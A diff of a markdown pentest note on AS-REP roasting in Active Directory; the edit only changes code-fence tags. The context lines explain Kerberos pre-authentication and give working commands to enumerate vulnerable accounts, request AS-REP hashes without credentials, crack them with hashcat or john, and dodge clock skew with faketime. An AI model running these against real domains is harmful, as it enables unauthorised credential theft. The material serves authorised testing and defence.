@@ -7,7 +7,7 @@ Kerberos pre-authentication forces a client to prove they know the user's passwo
 
 Normal pre-authentication flow:
 
-```
+``` wrap
 1. Client → KDC: "I'm Alice" + encrypted timestamp (AS-REQ)
                   timestamp encrypted with Alice's NTLM hash
 2. KDC decrypts timestamp → verifies identity → issues TGT (AS-REP)
@@ -17,7 +17,7 @@ The encrypted timestamp proves you know the password before the KDC gives you an
 
 When pre-auth is disabled:
 
-```
+``` wrap
 anyone → KDC: "I'm Alice" (no proof needed)
 KDC → anyone: here's Alice's AS-REP, encrypted with Alice's hash
 → crack offline → plaintext password
@@ -36,7 +36,7 @@ No credentials needed to perform the attack: completely unauthenticated if you h
 
 Search for accounts with `UF_DONT_REQUIRE_PREAUTH` (UAC flag `0x400000`) set.
 
-```powershell
+```powershell wrap
 # PowerView
 Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname, description
 
@@ -46,7 +46,7 @@ Get-ADUser -Filter * -Properties UserAccountControl |
   Select-Object Name, SamAccountName
 ```
 
-```bash
+```bash wrap
 # nxc: with creds
 nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt
 
@@ -58,7 +58,7 @@ nxc ldap $DC_IP -u '' -p '' -d $DOMAIN --dns-server $DC_IP --asreproast hashes.t
 
 Get the AS-REP blob and save it for offline cracking. Works with or without valid credentials.
 
-```bash
+```bash wrap
 # Without credentials: requires a username list
 GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile hashes.txt
 
@@ -69,7 +69,7 @@ GetNPUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -format hashcat -ou
 GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile single_user.txt -format hashcat
 ```
 
-```powershell
+```powershell wrap
 # Rubeus: all AS-REP roastable accounts
 Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
 
@@ -82,7 +82,7 @@ Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /domain:$DOMAIN /dc:$D
 
 ## Cracking
 
-```bash
+```bash wrap
 # hashcat mode 18200
 hashcat -m 18200 hashes.txt ~/tools/wordlists/rockyou
 
@@ -97,7 +97,7 @@ john hashes.txt --wordlist=~/tools/wordlists/rockyou
 
 Kerberos requires your clock to be within 5 minutes of the DC. If you get `KRB_AP_ERR_SKEW`, use `faketime` to offset your system time for the duration of the command without actually changing your clock.
 
-```bash
+```bash wrap
 # Run any command with a time offset
 faketime -f '+7h' GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile hashes.txt
 faketime -f '+7h' nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt
